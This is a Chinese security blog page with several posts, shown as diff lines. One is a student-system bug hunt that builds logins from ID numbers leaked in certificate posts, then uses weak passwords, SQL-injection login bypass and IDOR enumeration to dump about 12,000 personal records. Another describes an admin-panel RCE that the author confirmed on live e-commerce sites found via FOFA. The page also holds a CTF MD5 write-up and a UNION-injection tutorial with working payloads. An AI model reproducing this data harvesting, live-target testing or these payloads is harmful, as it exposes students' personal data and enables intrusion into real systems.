+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人是小白一个，最近刚上手挖edusrc，我会在本文分享最近挖掘edusrc的3个案例，两个高危一个中危，各位小白可以参考一下这个思路，大佬们看看就行了哈哈</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>前期的信息收集是非常重要的，渗透的本质就是信息收集。</p>
+<p>首先我并不是针对一个学校进行信息收集的，参考湘安无事-深情哥大佬的一个思路，很简单就是最近不是有蓝桥杯比赛么，有些学校没有把学生的信息打码就挂到微信公众号上了，上面包含身份证号还有姓名，直接在微信搜蓝桥杯证书，重点去看那些学校官方发的</p>
+<p><a target="_blank" rel="noopener" href="https://img.cdn1.vip/i/6968f87c757cd_1768487036.webp"></a></p>
+<h2 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h2><p>找到了一个学工系统</p>
+<p><a target="_blank" rel="noopener" href="https://img.cdn1.vip/i/696901361a4c0_1768489270.webp"></a></p>
+<p>但是账号名是学号，我们现在只有身份证号就准备用谷歌语法 site:xxx.com 姓名 看看能不能搞来这个人的学号。</p>
+<p>但是很遗憾并没有什么结果，那我们就只能找找有没有用姓名+身份证号登录的系统，有个方法就是找缴费系统这种很多都支持身份证号登录的，很快就找到了</p>
+<p><a target="_blank" rel="noopener" href="https://img.cdn1.vip/i/6968fd34e4704_1768488244.webp"><img src="https://img.cdn1.vip/i/6968fd34e4704_1768488244.webp"></a></p>
+<p>于是用身份证号登进去</p>
+<p><a target="_blank" rel="noopener" href="https://img.cdn1.vip/i/6968fe64e0798_1768488548.webp"><img src="https://img.cdn1.vip/i/6968fe64e0798_1768488548.webp"></a></p>
+<p>学号也是有了，虽然是进后台了但是这个就没必要测了出洞率很小的像这种系统。</p>
+<p>重新回到学工系统，试了几个弱密码没想到密码123456直接进去了</p>
+<p><a target="_blank" rel="noopener" href="https://img.cdn1.vip/i/696b9a1815d6e_1768659480.webp"><img src="https://img.cdn1.vip/i/696b9a1815d6e_1768659480.webp"></a></p>
+<p>这么多敏感信息直接开测。</p>
+<p>先用burp抓个包居然发现有id，这不可以测一波水平越权了吗？直接把id参数改成别的</p>
+<p><a target="_blank" rel="noopener" href="https://img.cdn1.vip/i/696b9b60ae565_1768659808.webp"><img src="https://img.cdn1.vip/i/696b9b60ae565_1768659808.webp"></a></p>
+<p>拿下拿下，遍历一遍id出来7000条信息</p>
+<h2 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h2><p>在一个公众号找到一个缴费系统</p>
+<p><a target="_blank" rel="noopener" href="https://img.cdn1.vip/i/696b9e48d9b82_1768660552.webp"><img src="https://img.cdn1.vip/i/696b9e48d9b82_1768660552.webp"></a></p>
+<p>直接在官网获奖名单找姓名，找到一个在后面加个’– 没想到直接登录成功了，没想到这么简单就得吃了个sql注入</p>
+<p><a target="_blank" rel="noopener" href="https://img.cdn1.vip/i/696ba1102690a_1768661264.webp"><img src="https://img.cdn1.vip/i/696ba1102690a_1768661264.webp"></a></p>
+<p>登录进去发现有个查看发票，点进去没啥信息就一个金额和姓名，但我感觉绝对没那么简单，抓包该页面发现请求有id参数，我们先看看返回包有啥子。</p>
+<p>居然sfzh什么的都有，这还说啥遍历id成功拿下5000多条信息，又简简单单拿下水平越权。</p>
+<p><a target="_blank" rel="noopener" href="https://img.cdn1.vip/i/696ba474467c4_1768662132.webp"><img src="https://img.cdn1.vip/i/696ba474467c4_1768662132.webp"></a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/07/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BB%8EWindows%E5%AE%89%E8%A3%85Linux%EF%BC%88Ubuntu%EF%BC%89%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qingshen">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qingshen's blog">
+      <meta itemprop="description" content="qingshen的博客：分享网络安全、编程、人工智能和生活">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | qingshen's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/10/07/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BB%8EWindows%E5%AE%89%E8%A3%85Linux%EF%BC%88Ubuntu%EF%BC%89%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/" class="post-title-link" itemprop="url">记录一次从Windows安装Linux（Ubuntu）的全过程</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-07 15:26:43" itemprop="dateCreated datePublished" datetime="2025-10-07T15:26:43+08:00">2025-10-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-30 20:58:50" itemprop="dateModified" datetime="2025-12-30T20:58:50+08:00">2025-12-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="系统更换原因"><a href="#系统更换原因" class="headerlink" title="系统更换原因"></a>系统更换原因</h2><p>由于我的这台电脑是我哥的到现在已经6年了，用的是越来越卡这个windows系统有时一直卡死导致只能重启，这个真的是特别麻烦。</p>
+<p>还有一点就是我这个人不太喜欢删文件桌面和D盘上堆满了文件，看的很不舒服。</p>
+<p>最近我看到关于Ubuntu图形版的页面我觉得很干净的，并且占用C盘内存较少也是非常流畅的，所以我就决定装这个系统了。</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="启动盘制作"><a href="#启动盘制作" class="headerlink" title="启动盘制作"></a>启动盘制作</h3><p>首先我从我抽屉里翻到了个落满灰尘的U盘，这个好像是我上次给我的电脑救砖时用的，现在可派上用场了可以做启动盘。</p>
+<p>现在就可以去做启动盘了，这里我推荐<a target="_blank" rel="noopener" href="https://www.ventoy.net/">Ventoy</a>。</p>
+<p>启动盘工具下载好后插入U盘，然后点击安装就行了（此过程会初始化U盘，有什么重要的数据务必要备份），等这个U盘名变为Ventoy就行了。</p>
+<p>接下来去下载系统镜像，我这里下的是<a target="_blank" rel="noopener" href="https://releases.ubuntu.com/22.04/ubuntu-22.04.5-desktop-amd64.iso">ubuntu-22.04.5-desktop-amd64</a>这个版本比较稳定，也可以选择其他版本。</p>
+<p>下载好后就拷贝到U盘里就行了，现在这个启动盘就搞好了。</p>
+<h3 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h3><p>现在先关机，不同笔记本进BISO的方法不一样我这里是联想笔记本在开机的时候狂按F2就进去了，以下是别的电脑进BISO的方法：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">联想（Lenovo）：F2 或 Fn + F2</span><br><span class="line">惠普（HP）：Esc 然后按 F10，或直接按 F10</span><br><span class="line">戴尔（Dell）：F2 或 Fn + F2</span><br><span class="line">华硕（ASUS）：Delete 或 F2</span><br><span class="line">宏碁（Acer）：F2 或 Delete</span><br><span class="line">微星（MSI）：Delete</span><br><span class="line">技嘉（Gigabyte）：Delete 或 F2</span><br><span class="line">三星（Samsung）：F2</span><br><span class="line">索尼（Sony VAIO）：F2 或 Assist 键（部分型号）</span><br></pre></td></tr></table></figure>
+
+<p>这里会有个联想的独有的intelRST问题很重要，不然在后续的系统安装会出现：</p>
+<p><img src="https://picx.zhimg.com/v2-dc3c94cdf3fdc812ad5bbed3cdf60fd7_1440w.jpg" alt="联想Intel RST问题"></p>
+<p>解决方法很简单进BISO后Main那里Ctrl+S，就会出现SATA Mode，选ACHI即可然后记得保存。</p>
+<p>之后就简单多了改启动项为U盘一般带USB的就是，然后一路回车进入Ubuntu安装页面就行了跟着指引走。</p>
+<h2 id="安装一些软件"><a href="#安装一些软件" class="headerlink" title="安装一些软件"></a>安装一些软件</h2><p>这里我会引用一些别人的文章，讲的非常详细，我当时就是根据这些文章来安装的。</p>
+<p>搜狗输入法:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44684757/article/details/135991216">https://blog.csdn.net/qq_44684757/article/details/135991216</a><br><em>要点：注意安装依赖</em><br>QQ:<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44629973/article/details/102871352">https://blog.csdn.net/weixin_44629973/article/details/102871352</a></p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>整体来说是比较流畅的，系统也很干净简洁没啥广告，只不过还要适应一段时间。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/01/Bugku-CTF-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qingshen">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qingshen's blog">
+      <meta itemprop="description" content="qingshen的博客：分享网络安全、编程、人工智能和生活">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | qingshen's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/10/01/Bugku-CTF-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/" class="post-title-link" itemprop="url">Bugku-CTF-备份是个好习惯</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-01 21:07:49" itemprop="dateCreated datePublished" datetime="2025-10-01T21:07:49+08:00">2025-10-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-30 20:59:02" itemprop="dateModified" datetime="2025-12-30T20:59:02+08:00">2025-12-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>这题的话可以先从这个题目看应该是和备份有关系的，就会想到bak后缀。</p>
+<p>打开网站是一段神秘代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e</span><br></pre></td></tr></table></figure>
+<p>然后就下意识的查看网站源代码但并没有什么收获，只能转向目录扫描了，直接上御剑目录扫描。</p>
+<p>发现有一个index.php.bak文件直接访问下载了一个备份文件，代码内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接开始代码审计。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个是他的一个验证逻辑就是将输入的两个值加密进行比较，要求a&#x3D;b和md5(a)&#x3D;md5(b)，现在就可以MD5弱类型比较来解决了。</p>
+<p>有些字符串的MD5值都以0e开头，在科学计数法中等于0：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 经典MD5碰撞值</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>)          = <span class="number">0e830400451993494058024219903391</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="string">&#x27;240610708&#x27;</span>)        = <span class="number">0e462097431906509019562988736854</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="string">&#x27;s878926199a&#x27;</span>)      = <span class="number">0e545993274517709034328855841020</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="string">&#x27;s155964671a&#x27;</span>)      = <span class="number">0e342768416822451524974117254469</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 弱比较时：</span></span><br><span class="line"><span class="number">0e830400451993494058024219903391</span> == <span class="number">0e462097431906509019562988736854</span></span><br><span class="line"><span class="comment">// 因为都等于 0 × 10^N = 0</span></span><br></pre></td></tr></table></figure>
+<p>借助这个漏洞就可以构建Payload:index.php?kkeyey1&#x3D;QNKCDZO&amp;kkeyey2&#x3D;240610708</p>
+<p>还有另一种方法：</p>
+<p>由于md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</p>
+<p>所以可以也可以构建Payload:index.php?kkeyey1[]&#x3D;1&amp;kkeyey2[]&#x3D;2<br>同样能获得flag。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/09/06/%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E4%BB%8E%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%88%B00day%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qingshen">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qingshen's blog">
+      <meta itemprop="description" content="qingshen的博客：分享网络安全、编程、人工智能和生活">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | qingshen's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/09/06/%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E4%BB%8E%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%88%B00day%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">电商平台后台RCE漏洞分析：从弱口令到0day利用</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-09-06 12:00:00" itemprop="dateCreated datePublished" datetime="2025-09-06T12:00:00+08:00">2025-09-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-30 20:58:31" itemprop="dateModified" datetime="2025-12-30T20:58:31+08:00">2025-12-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>近日，朋友发现某电商平台存在一个高危漏洞，将数据包发给我进行审计。首先使用Seay源代码审计系统对代码包进行自动化扫描，系统报告了300+个潜在漏洞点，我将结果丢给AI，从中筛选出1个最可能被利用的高危远程代码漏洞。</p>
+<h2 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h2><p><code>app/common/logic/admin/config.php</code>文件中的配置写入功能存在代码注入漏洞。</p>
+<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="string">&quot;return [</span></span><br><span class="line"><span class="string">    &#x27;url&#x27; =&gt; &#x27;&quot;</span> . <span class="variable">$param</span>[<span class="string">&#x27;m_url&#x27;</span>] . <span class="string">&quot;&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;title&#x27; =&gt; &#x27;&quot;</span> . <span class="variable">$param</span>[<span class="string">&#x27;title&#x27;</span>] . <span class="string">&quot;&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;map_key&#x27; =&gt; &#x27;&quot;</span> . <span class="variable">$param</span>[<span class="string">&#x27;map_key&#x27;</span>] . <span class="string">&quot;&#x27;</span></span><br><span class="line"><span class="string">]&quot;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php\n &quot;</span> . <span class="variable">$code</span> . <span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">config_path</span>() . <span class="string">&quot;site.php&quot;</span>, <span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+
+<p>漏洞原理</p>
+<p>该段代码直接将用户输入的参数（$param[‘title’]等）拼接至PHP配置文件中，未做任何过滤处理。攻击者可以通过注入PHP代码，实现远程代码执行。<br>漏洞复现</p>
+<p>在后台修改网站标题处输入：.phpinfo().</p>
+<p>系统生成的配置文件内容变为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span> =&gt; <span class="string">&#x27;http://example.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">phpinfo</span>().<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;map_key&#x27;</span> =&gt; <span class="string">&#x27;key_value&#x27;</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;config&#x2F;site.php文件即可触发phpinfo()执行。</p>
+<p>但该漏洞需要后台权限才能利用，我发现管理员后台账号密码默认为admin。</p>
+<p>在FOFA找到百个资产，测试了10个有4个存在弱口令，RCE也验证成功。</p>
+<p>因此攻击链可完整形成：</p>
+<p>弱口令进入后台 → 利用RCE漏洞获取服务器权限</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/08/06/SQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qingshen">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qingshen's blog">
+      <meta itemprop="description" content="qingshen的博客：分享网络安全、编程、人工智能和生活">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | qingshen's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/08/06/SQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL联合查询注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-08-06 12:00:00" itemprop="dateCreated datePublished" datetime="2025-08-06T12:00:00+08:00">2025-08-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-30 20:59:34" itemprop="dateModified" datetime="2025-12-30T20:59:34+08:00">2025-12-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>平时在浏览网页时会注意到有这种网址</p>
+<p><strong>GET请求类型</strong></p>
+<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a><br><a href="http://example.com/profile?user=admin">http://example.com/profile?user=admin</a></p>
+<p><strong>POST请求类型</strong></p>
+<p>username: admin<br>password: anything</p>
+<p>等等这个样子的都在与数据库产生信息传递</p>
+<p>以比较简单的GET请求来说</p>
+<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘</p>
+<p>假设这个网站是一个通过学号查询个人信息的程序，这个id处输入学号然后返回该学号的一些个人信息</p>
+<p>这个news.php种必定有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT id, username, email FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>代码第一行从url的id参数获取值（学号）存储到id这个变量<br>代码第二行将id变量拼接到SQL语句中查询users表中匹配的id并返回相关的id username email 从users表中</p>
+<p>此时如果我们<a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘</p>
+<p>此时这个SQL代码就是</p>
+<p>SELECT id, username, email FROM users WHERE id&#x3D;’1’’ LIMIT 1</p>
+<p>必定会返回一个报错，那就证明这个位置存在SQL注入漏洞，因为并没有过滤’</p>
+<p>我们第一步肯定是要获取它这个表中有几个列<a href="http://example.com/news.php?id=%271">http://example.com/news.php?id=&#39;1</a>‘ ORDER BY 1–+ ‘ LIMIT 1</p>
+<p>此时这个SQL代码就是</p>
+<p>SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’ LIMIT 1</p>
+<p>有些人估计会发现和自己想的不一样，不应该是<br>SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’LIMIT 1吗</p>
+<p>其实是因为第二个’ 已经将第一个’闭合掉了 然后–注释掉’ LIMIT 1<br>这样才可以执行ORDER by 1</p>
+<p>接下来先了解一下这个ORDER by是什么东东</p>
+<p>ORDER BY是 SQL 语言中的一个关键子句，主要用于对查询结果进行排序</p>
+<p>比如ORDER by 3 会对email进行一个查排序</p>
+<p>如果将3换成4，会返回报错，因为它没有4这个列数，因此就可以通过这个机制判断这个表有几列</p>
+<p>可以不断增加这个查询的数直到报错，那这个表的列数就为查询的数-1</p>
+<p>前面这些都是比较基础的，都是为本文的重点联合查询注入作铺垫</p>
+<p><a href="http://example.com/news.phpid=1">http://example.com/news.phpid=1</a>‘ UNION SELECT 1,2,3–+</p>
+<p>此时这个SQL代码就是</p>
+<p>SELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,2,3–+’ LIMIT 1</p>
+<p>先来了解一下联合查询语句UNION SELECT</p>
+<p>SQL UNION 操作符合并两个或多个 SELECT 语句的结果</p>
+<p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。它可以从多个表中选择数据，并将结果集组合成一个结果集。使用 UNION 时，每个 SELECT 语句必须具有相同数量的列，且对应列的数据类型必须相似</p>
+<p>如果页面上返回了3那么这个地方就是原本email显示的地方，知道这个以后就可以换成将这个位置换成更敏感的语句</p>
+<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘ UNION SELECT 1,database(),version()–+</p>
+<p>此时这个SQL代码就是</p>
+<p>SELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,database(),version()–+’ LIMIT 1</p>
+<p>就可以返回</p>
+<pre><code>当前数据库名称
